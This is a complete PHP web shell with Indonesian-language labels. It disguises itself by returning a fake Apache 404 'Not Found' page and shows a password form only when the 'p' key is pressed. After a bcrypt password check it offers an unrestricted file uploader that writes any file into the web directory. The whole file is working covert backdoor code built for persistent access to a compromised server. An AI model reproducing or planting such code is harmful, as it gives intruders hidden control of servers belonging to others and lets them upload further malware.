<?php
session_start();


$hash_sandi = '$2a$12$2WvDFeg21GKm6ylmXNNN9e2TnAmGwMbhabNP7c8CnAnSAZzmJYdZ.';
function fake_error() {
    header("HTTP/1.0 404 Not Found");
    echo "<h1>Not Found</h1>";
    echo "The requested URL " . htmlspecialchars($_SERVER['REQUEST_URI']) . " was not found on this server.<br><hr>Apache/2.4.41 (Ubuntu) Server at ".$_SERVER['HTTP_HOST']." Port 80";
}
if (isset($_SESSION['auth']) && $_SESSION['auth'] === true) {
    echo "Uploader<br><br>";
    echo '<form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="file" size="50">
            <input name="_upl" type="submit" value="Upload">
          </form>';

    if (isset($_POST['_upl']) && $_POST['_upl'] == "Upload") {
        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            echo "<b>Upload berhasil !!!</b><br><br>";
        } else {
            echo "<b>Upload gagal !!!</b><br><br>";
        }
    }

    echo '<br><a href="?logout=1">Logout</a>';
    if (isset($_GET['logout'])) {
        session_destroy();
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    }
    exit;
}


if (isset($_POST['kunci'])) {
    if (password_verify($_POST['kunci'], $hash_sandi)) {
        $_SESSION['auth'] = true;
        header("Location: ".$_SERVER['PHP_SELF']);
        exit;
    } else {
        echo "<b>Sandi salah!</b><br>";
    }
}


fake_error();
?>

<div id="loginForm" style="display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:20px;border:2px solid #333;box-shadow:0 0 10px rgba(0,0,0,.5);z-index:999;">
    <form method="post">
        <b>Masukkan Sandi</b><br>
        <input type="password" name="kunci">
        <input type="submit" value="Masuk">
    </form>
</div>
<script>
document.addEventListener("keydown", function(e){
    if(e.key === "p" || e.key === "P"){
        document.getElementById("loginForm").style.display = "block";
    }
});
</script>